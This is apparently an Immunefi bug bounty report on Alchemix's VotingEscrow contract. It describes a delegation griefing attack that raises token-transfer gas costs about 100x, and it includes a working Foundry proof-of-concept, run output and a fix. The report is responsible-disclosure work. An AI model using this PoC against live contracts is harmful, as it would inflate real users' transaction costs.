# 31410 - \[SC - Medium] Griefing Attack using delegate will expose User...

Submitted on May 18th 2024 at 17:34:53 UTC by @Breeje for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31410

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Currently, `MAX_DELEGATES` is set to `1024`, opening up a Griefing Attack Vector that can make it `100x` more expensive for users to transfer tokens.

## Vulnerability Details

Any user can delegate the balance of the locked NFT amount to anyone by calling the `delegate` function:

```solidity

    function delegate(address delegatee) public {
        require(delegatee != address(0), "cannot delegate to zero address");
        return _delegate(msg.sender, delegatee);
    }

```

As the delegated tokens are maintained in an array that can be vulnerable to DOS attack, the `VotingEscrow` has a safety check of `MAX_DELEGATES = 1024` preventing an address from having a huge array.

```solidity

    /// @notice Maximum number of delegates a token can have
    uint256 public constant MAX_DELEGATES = 1024; // avoid too much gas

```

```solidity

    require(dstTokensOld.length + 1 <= MAX_DELEGATES, "dst would have too many tokenIds");

```

Delegating from an address with a shorter token list to one with a longer list is cheaper. An attacker can create a new address, lock tokens, and delegate to the victim's address, significantly increasing the gas cost for the victim to transfer `veALCX` tokens.

In the current implementation, it costs users more than 23M gas to transfer a `veALCX` token when there are 1023 delegates (see PoC for details).

Although this won't cause a DoS due to Ethereum's gas limit of 30M, but it will increase the gas cost for users by **100x**.

## Impact Details

Griefing Attack exposes users to a `100x` increase in the cost of transferring tokens.

## Recommendation

While testing, I found that Keeping `MAX_DELEGATES` value to `128` will max cost User close to 3M Gas, around `10x` the normal cost. This can provide a balance between offering delegation and protecting users from a Griefing Attack that could increase their costs by `100x`.

## Proof of Concept

#### Test Code

Add the following test function in `VotingEscrow.t.sol` test.

```solidity

    function testDelegateLimitAttack() public {

        // 1. Create Lock
        deal(bpt, address(this), TOKEN_1M);
        IERC20(bpt).approve(address(veALCX), TOKEN_1M);
        uint256 tokenId = veALCX.createLock(TOKEN_1, 3 * ONE_WEEK, false);
        
        // 2. Have 1023 Fake Accounts which delegates to this address.
        for(uint256 i = 0; i < veALCX.MAX_DELEGATES() - 1; i++) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 2);
            address fakeAccount = address(uint160(420 + i));
            deal(bpt, fakeAccount, TOKEN_1);
            vm.startPrank(fakeAccount);
            IERC20(bpt).approve(address(veALCX), TOKEN_1);
            veALCX.createLock(TOKEN_1, 3 * ONE_WEEK, false);
            veALCX.delegate(address(this));
            vm.stopPrank();
        }
        
        hevm.warp(block.timestamp + 3 * ONE_WEEK + nextEpoch);

        uint256 lockEnd = veALCX.lockEnd(tokenId);
        hevm.warp(block.timestamp + lockEnd);
        
        veALCX.startCooldown(tokenId);
        hevm.warp(block.timestamp + nextEpoch);

        // 3. Check gas used to transfer the token
        uint initialGas = gasleft();
        veALCX.safeTransferFrom(veALCX.ownerOf(tokenId), beef, tokenId);
        uint gasUsed = initialGas - gasleft();
        console2.log("Gas Used for 1023 Delegate = ", gasUsed);
    }

```

To compare gas usage with 1 delegate, run the following:

```solidity

    function testDelegateLimitAttack() public {

        // 1. Create Lock
        deal(bpt, address(this), TOKEN_1M);
        IERC20(bpt).approve(address(veALCX), TOKEN_1M);
        uint256 tokenId = veALCX.createLock(TOKEN_1, 3 * ONE_WEEK, false);
        
        // 2. Have 1023 Fake Accounts which delegates to this address.
        // for(uint256 i = 0; i < veALCX.MAX_DELEGATES() - 1; i++) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 2);
            address fakeAccount = address(uint160(420 + 1));
            deal(bpt, fakeAccount, TOKEN_1);
            vm.startPrank(fakeAccount);
            IERC20(bpt).approve(address(veALCX), TOKEN_1);
            veALCX.createLock(TOKEN_1, 3 * ONE_WEEK, false);
            veALCX.delegate(address(this));
            vm.stopPrank();
        // }
        
        hevm.warp(block.timestamp + 3 * ONE_WEEK + nextEpoch);

        uint256 lockEnd = veALCX.lockEnd(tokenId);
        hevm.warp(block.timestamp + lockEnd);
        
        veALCX.startCooldown(tokenId);
        hevm.warp(block.timestamp + nextEpoch);

        // 3. Check gas used to transfer the token
        uint initialGas = gasleft();
        veALCX.safeTransferFrom(veALCX.ownerOf(tokenId), beef, tokenId);
        uint gasUsed = initialGas - gasleft();
        console2.log("Gas Used for 1 Delegate = ", gasUsed);
    }

```

#### Running the code

Use the following command to run the code:

```powershell

  forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/${ALCHEMY_API} --match-test testDelegateLimitAttack --fork-block-number 17133822 -vvv

```

#### Result

Gas required to transfer token with 1023 delegates:

```powershell

    Running 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
    [PASS] testDelegateLimitAttack() (gas: 12606294184)
    Logs:
      Gas Used for 1023 Delegate =  23442846

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.26s

    Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

Gas required to transfer token with 1 delegate:

```powershell

    Running 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
    [PASS] testDelegateLimitAttack() (gas: 2636939)
    Logs:
      Gas Used for 1 Delegate =  266145

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.40ms

    Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

#### Analysis of Result

* Gas required to transfer token with 1 delegate: 266k Gas
* Gas required to transfer token with 1023 delegates: 23M Gas

Given Ethereum's gas limit of 30M, the transfer function won't cause a DoS, but the gas cost can be increased by almost `100x` through this Griefing Attack.

As suggested in recommendation: By setting `MAX_DELEGATES` to 128, the gas cost required was 3.1M, close to `10x` the normal cost, striking a balance between providing the delegation feature and protecting users from this Griefing Attack.
